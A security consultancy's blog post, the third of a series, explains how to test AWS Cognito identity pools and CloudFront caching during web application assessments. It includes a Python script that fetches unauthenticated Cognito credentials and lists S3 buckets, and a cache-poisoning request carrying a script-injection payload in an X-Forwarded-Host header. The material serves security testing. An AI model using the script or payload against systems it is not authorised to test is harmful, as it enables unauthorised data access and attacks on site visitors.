---
title: "A practical guide to testing the security of Amazon Web Services Part 3 AWS Cognito and AWS CloudFront"
date: 2020-02-14T03:52:00.002-08:00
draft: false
type: posts
categories: 
- 
---
# A practical guide to testing the security of Amazon Web Services Part 3 AWS Cognito and AWS CloudFront

<br/>

<br/>
This is the last part of our 3 posts journey discussing the main Amazon Web Services and their security.  
  
In the previous two parts we discussed two of the most used Amazon services, namely AWS S3 and AWS EC2. If you still haven't checked them, you can find them here: [Part 1](https://blog.mindedsecurity.com/2018/09/a-practical-guide-to-testing-security.html) and [Part 2](https://blog.mindedsecurity.com/2018/09/a-practical-guide-to-testing-security_18.html).  
  
In this final post we discuss two additional services that you might encounter when analyzing the security of a web application: _[AWS Cognito](https://aws.amazon.com/it/cognito/)_ and _[AWS CloudFront](https://aws.amazon.com/it/cloudfront/)_.  
These are two very different services related to supporting web applications in two specific areas:  
  

-   _AWS Cognito_ aims at providing an access control system that developers can implement in their web applications. 
-   _AWS CloudFront_ is a Content Delivery Network (CDN) that delivers your data to the users with low latency and high transfer speed.

  
  

### AWS Cognito

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpqySyjh0heiZdC-zhFWBfDBTc6WKv-m60tShU5mi-gOU2JpbtSwKVRbphPGM1B4uQQ9mdfjKGxlsHCNPsAZHTlvw20cgkEK7otDlJMEl_qUlLipboWd48lp4s8QFEhxjoI90Nhv2fsvKj/s200/MobileServices_AmazonCognito.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpqySyjh0heiZdC-zhFWBfDBTc6WKv-m60tShU5mi-gOU2JpbtSwKVRbphPGM1B4uQQ9mdfjKGxlsHCNPsAZHTlvw20cgkEK7otDlJMEl_qUlLipboWd48lp4s8QFEhxjoI90Nhv2fsvKj/s1600/MobileServices_AmazonCognito.png)  
  
It provides developers with an authentication, authorization and user management system that can be implemented in web applications and is divided in two components:  
  

-   user pools;
-   identity pools. 

Quoting [AWS documentation](https://docs.amazonaws.cn/en_us/cognito/latest/developerguide/cognito-scenarios.html) on Cognito:  

> User pools are user directories that provide sign-up and sign-in options for your app users. Identity pools enable you to grant your users access to other AWS services. You can use identity pools and user pools separately or together.

From a security perspective, we are particularly interested in _identity pools_ as they provide access to other AWS services we might be able to mess with.  
  
Identity pools are identified by an ID that looks like this:  

>  us-east-1:1a1a1a1a-ffff-1111-9999-12345678

  
A web application will then query AWS Cognito by specifying the proper _Identity pool ID_ in order to get temporary limited-privileged AWS credentials to access other AWS services.  
  
An identity pool also allows to specify a role for users that are not authenticated.  
Amazon documentation states:  

> Unauthenticated roles define the permissions your users will receive when they access your identity pool without a valid login.

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGCIv1qSXnJOK-b9IgjFKP3usDLAxE-kkhjy7USy5E6DVoOVxzaV4YAx0HNv26W08HX_NuTIJWF5gbNP1W1JLGgAY_E2GJ-SJvDZ-KMPu78yQhYIZy0z_0TqPdXAuts0ekm0ICnBYvX0DY/s1600/unauthenticated.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGCIv1qSXnJOK-b9IgjFKP3usDLAxE-kkhjy7USy5E6DVoOVxzaV4YAx0HNv26W08HX_NuTIJWF5gbNP1W1JLGgAY_E2GJ-SJvDZ-KMPu78yQhYIZy0z_0TqPdXAuts0ekm0ICnBYvX0DY/s1600/unauthenticated.png)

  

  
  
This is clearly something worth checking during the assessment of a web application that takes advantage of AWS Cognito.  
  
In fact, let's consider the following scenario of a web application that allows access to AWS S3 buckets upon proper authentication with the identity pool that provides temporary access to the bucket.  
  
Now suppose that the identity pool has also been configured to grant access to unauthenticated identities with the same privileges of accessing AWS S3 buckets.  
  
In such a situation, an attacker will be able to access the application credentials to AWS.  
  
The following python script will try to get unauthenticated credentials and use them to list the AWS S3 buckets.  
  

In the following script, just replace IDENTITY\_POOL with the Identity Pool ID identified during the assessment. 

  

  

\# NB: This script requires boto3.  
\# Install it with:  
\# sudo pip install boto3  
import boto3

from botocore.exceptions import ClientError  
  

try:

   # Get access token

   client = boto3.client('cognito-identity', region\_name="us-east-2")

   resp =  client.get\_id(IdentityPoolId=\[IDENTITY\_POOL\])

  

   print "\\nIdentity ID: %s"%(resp\['IdentityId'\])

   print "\\nRequest ID: %s"%(resp\['ResponseMetadata'\]\['RequestId'\])

   resp = client.get\_credentials\_for\_identity(IdentityId=resp\['IdentityId'\])

   secretKey = resp\['Credentials'\]\['SecretKey'\]

   accessKey = resp\['Credentials'\]\['AccessKeyId'\]

   sessionToken = resp\['Credentials'\]\['SessionToken'\]

   print "\\nSecretKey: %s"%(secretKey)

   print "\\nAccessKey ID: %s"%(accessKey)

   print "\\nSessionToken %s"%(sessionToken)  
  

   # Get all buckets names

   s3 = boto3.resource('s3',aws\_access\_key\_id=accessKey, aws\_secret\_access\_key=secretKey, aws\_session\_token=sessionToken, region\_name="eu-west-1")

    print "\\nBuckets:"

   for b in s3.buckets.all():

       print b.name  
  

except (ClientError, KeyError):

   print "No Unauth"

   exit(0)

  

  

  
  
If unauthenticated user access to AWS S3 buckets is allowed, your output should look something like this:  
  

  

Identity ID: us-east-2:ddeb887a-e235-41a1-be75-2a5f675e0944  
  
Request ID: cb3d99ba-b2b0-11e8-9529-0b4be486f793  
  
SecretKey: wJE/\[REDACTED\]Kru76jp4i  
  
AccessKey ID: ASI\[REDACTED\]MAO3  
  
SessionToken AgoGb3JpZ2luELf\[REDACTED\]wWeDg8CjW9MPerytwF  
  
Buckets:  
mindeds3log  
mindeds3test01

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9_-0EZYHXOs7xtXH18y0jCmhOFXekmc1D_wr9VRpJyouliCMPnLSna0jTf2j-V_wz0wsNudXYmplVynTeZ6JpWyPYvhFQEuAqbGZoVpRgaLVwV9i5izoCkQ4u-noW4JDPsxum8F7Le32A/s200/NetworkingContentDelivery_AmazonCloudFront.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9_-0EZYHXOs7xtXH18y0jCmhOFXekmc1D_wr9VRpJyouliCMPnLSna0jTf2j-V_wz0wsNudXYmplVynTeZ6JpWyPYvhFQEuAqbGZoVpRgaLVwV9i5izoCkQ4u-noW4JDPsxum8F7Le32A/s1600/NetworkingContentDelivery_AmazonCloudFront.png)  
  

### AWS CloudFront

AWS CloudFront is Amazon's answer to a Content Delivery Network service which purpose is to improving the performances of delivering content from web applications.  
The following images depict the basics of how CloudFront work.  
  
  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-dVmx2pRUTk8w6lUEJGleDw4EqslHQDypUlD9YRVy7SsoerM1inLFI7NQcO1spbYZaTidwZ755TB0_KazFp4TZQfjBrv3m_kuKRJUhE_fVNvR9iRcot2ujGjoVbzEYDxKPksogfpR40ys/s1600/CloudFront+01.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-dVmx2pRUTk8w6lUEJGleDw4EqslHQDypUlD9YRVy7SsoerM1inLFI7NQcO1spbYZaTidwZ755TB0_KazFp4TZQfjBrv3m_kuKRJUhE_fVNvR9iRcot2ujGjoVbzEYDxKPksogfpR40ys/s1600/CloudFront+01.png)

The browser requests _resource X_ from the edge location.  
If the edge location has a cached copy of _resource X_ it simply sends it back to the browser.  
  
The following picture describes what happens if _resource X_ is not cached in the edge location.  
  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgF6Kd_Myda1gMZOxJuWEdbuwGlDJVhg-MbCXj4kueT6iXZ5h1ehzej-6Icfsasv7Cz8-b96qMK9SPW3NLZgE9Gn-2g8SYEfXumSl8m42R6caR5yD4Ply8TnyA2MG8F8L78uKLTxGTFjzIU/s640/CloudFront+02.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgF6Kd_Myda1gMZOxJuWEdbuwGlDJVhg-MbCXj4kueT6iXZ5h1ehzej-6Icfsasv7Cz8-b96qMK9SPW3NLZgE9Gn-2g8SYEfXumSl8m42R6caR5yD4Ply8TnyA2MG8F8L78uKLTxGTFjzIU/s1600/CloudFront+02.png)

  
  
  

-   The browser requests _resource X_ to the edge location which doesn't have a cached version. 
-   The edge location thus requests _resource X_ to its origin, meaning where the original copy of _resource X_ is stored. (This is decided upon configuring CloudFront for a given domain. )
-   The origin location can be, for example, an Amazon service such as an S3 bucket, or a different server not being part of Amazon. 
-   The edge location receives _resource X_ and stores it in its cache for future use and finally sends it back to the browser. 

  
This simple caching mechanism can be very helpful when it comes to improve the performances of querying a web application but it might also hide some unwanted behavior.  
  

As recently shown by [James Kettle](https://portswigger.net/blog/practical-web-cache-poisoning), web applications relying on cache for dynamic pages should be aware of the possibility to abuse such caching functionality and deliver malicious content to the users a.k.a. cache poisoning.  
Briefly, as described by Kettle in [his post](https://portswigger.net/blog/practical-web-cache-poisoning), web cache systems need a way to uniquely identify a request in order to not keep contacting the origin location.  
To do so, few parts of an HTTP request are considered to fully identify the request and are called **cache keys**. Whenever a cache key changes, the caching system will consider it as a different request and, if it doesn't have a cached copy of it, will contact the origin location.  
The basic idea behind web applications cache poisoning is to find an HTTP parameter that is not a cache key and that can be used to manipulate the content of a web page. When such a parameter is found, an attacker might be able to cache a request containing a malicious payload for that parameter and, whenever other users perform the same request, the caching system will answer with the cached version containing the malicious payload.  
  
Let's consider the following simple request taken from James' post:  
  

  

GET /en?cb=1 HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host: canary  
  
HTTP/1.1 200 OK  
Cache-Control: public, no-cache  
…  
<meta property="og:image" content="https://canary/cms/social.png" />

  

  

  
The value for X-Forwarded-Host has been used to generate an Open Graph URL inside a meta tag in the HTML of the web page. By changing canary with a."><script>alert(1)</script> it's possible to mess with the HTML and generate an alert box.  
  

  

GET /en?cb=1 HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host: a."><script>alert(1)</script>  
  

  
  

HTTP/1.1 200 OK  
Cache-Control: public, no-cache  
…  
<meta property="og:image" content="https://a."><script>alert(1)</script>/cms/social.png" />

  
However, in this case, X-Forwarded-Host is not used as a cache key. This means that it is possible to cache the request containing the alert code in the web cache so that it will be served to other users in the future. As it becomes clear from James' post, X-Forwarded-Host and X-Forwarded-Server are two widely used HTTP headers that do not contribute in the set of cache keys and are valuable candidates to perform cache poisoning attacks. James has also developed a Burp plug-in called [param-miner](https://github.com/PortSwigger/param-miner) that can be used to identify HTTP parameters that are not used as cached keys.  

### Conclusion

This post concludes our journey into the main Amazon Web Services and how to account for them when testing the security of web applications.  
It is undeniable that AWS provides a comprehensive solution that companies take advantage of instead of having to take care of the entire infrastructure by themselves. However, companies are the ones in charge of managing the configurations of the services they decide to use. It thus becomes crucial to test and verify such configurations.

#### [Source](https://blog.mindedsecurity.com/feeds/463731402428102234/comments/default)

<br/>
---
